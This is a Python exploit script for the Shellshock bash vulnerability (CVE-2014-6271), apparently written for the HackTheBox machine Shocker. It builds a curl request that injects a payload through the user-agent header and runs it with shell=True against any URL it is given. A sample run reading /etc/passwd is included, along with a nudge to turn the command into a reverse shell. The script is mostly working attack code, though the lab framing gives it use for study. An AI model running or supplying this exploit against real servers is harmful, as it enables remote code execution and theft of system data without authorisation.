#!/usr/bin/env python3

"""
Shellshock is one of many security bugs found in the unix bash shell, first discovered the 24th of September 2014. 
The Shellshock vulnerability allows remote code execution (RCE) which means that an attacker can execute commands
on the target machine without having to have physical access. HTTP Apache server's running CGI scripts were especially
vulnerable to Shellshock. Search for this CVE for more on Shellshock: CVE-2014-6271.

Tested on Shocker from HackTheBox

Discovered cgi-bin/ directory using gobuster and then ran:
"dirsearch -u http://10.10.10.56/cgi-bin/ -e sh, php"
which provided me with the file "user.sh" which is a shell executable file.

I then used this python script with the following arguments:
python3 shellshock.py -u http://10.10.10.56/cgi-bin/user.sh -c "cat /etc/passwd"

resulting in the following:
 EXPLOITING THE SHELLSHOCK VULNERABILITY.
Executing command: curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://10.10.10.56/cgi-bin/user.sh                                                                
                                                                                                                                                                                            
root:x:0:0:root:/root:/bin/bash                                                                                                                                                             
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin                                                                                                                                             
bin:x:2:2:bin:/bin:/usr/sbin/nologin                                                                                                                                                        
sys:x:3:3:sys:/dev:/usr/sbin/nologin                                                                                                                                                        
sync:x:4:65534:sync:/bin:/bin/sync                                                                                                                                                          
games:x:5:60:games:/usr/games:/usr/sbin/nologin                                                                                                                                             
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin                                                                                                                                             
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin                                                                                                                                                
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin                                                                                                                                                 
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin                                                                                                                                           
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin                                                                                                                                         
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin                                                                                                                                                  
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin                                                                                                                                        
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin                                                                                                                                        
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin                                                                                                                               
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin                                                                                                                                            
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin                                                                                                           
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin                                                                                                                                  
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false                                                                                                          
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false                                                                                                       
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false                                                                                                               
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false                                                                                                                    
syslog:x:104:108::/home/syslog:/bin/false                                                                                                                                                   
_apt:x:105:65534::/nonexistent:/bin/false                                                                                                                                                   
lxd:x:106:65534::/var/lib/lxd/:/bin/false                                                                                                                                                   
messagebus:x:107:111::/var/run/dbus:/bin/false                                                                                                                                              
uuidd:x:108:112::/run/uuidd:/bin/false                                                                                                                                                      
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false                                                                                                                                     
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin                                                                                                                                           
shelly:x:1000:1000:shelly,,,:/home/shelly:/bin/bash

Modify the cmd argument above to get a reverse shell!!
"""

import subprocess
from argparse import ArgumentParser

def parseArgs():
  parser = ArgumentParser(usage="shellshock.py -u [targetUrl] -c [cmdToExecute]")

  # Arguments for exploit
  parser.add_argument('-u', '--url', dest='url',
  	required=True, type=str,
  	help='url of target machine')

  parser.add_argument('-c', '--cmd', dest='cmd',
  	required=True, type=str,
  	help='command to execute on target\'s machine')
  
  args = parser.parse_args()
  return args
                      
                      
def shellShock(cmd, url):
  """
  Crafts a curl requests and performs the Shellshock exploit.
  
  Parameters:
    cmd (str): commmand to execute on vulnerable target.
    url (str): the victims machine url 
  """

  ''' Crafting the curl requests using the shellshock vulnerability sent as the user-agent '''
	
  exploit = 'curl -H \"user-agent: () { :; }; echo; echo; /bin/bash -c '
  exploit += '\'' + cmd + '\'"'
  exploit += ' ' + url

  print("Executing command:", exploit)
  subprocess.run(exploit, shell=True)


def main():
  args = parseArgs()

  cmd = args.cmd
  url = args.url

  red = '\033[31m'
  print(red, "EXPLOITING THE SHELLSHOCK VULNERABILITY!")
  shellShock(cmd , url)


if __name__ == '__main__':
	main()
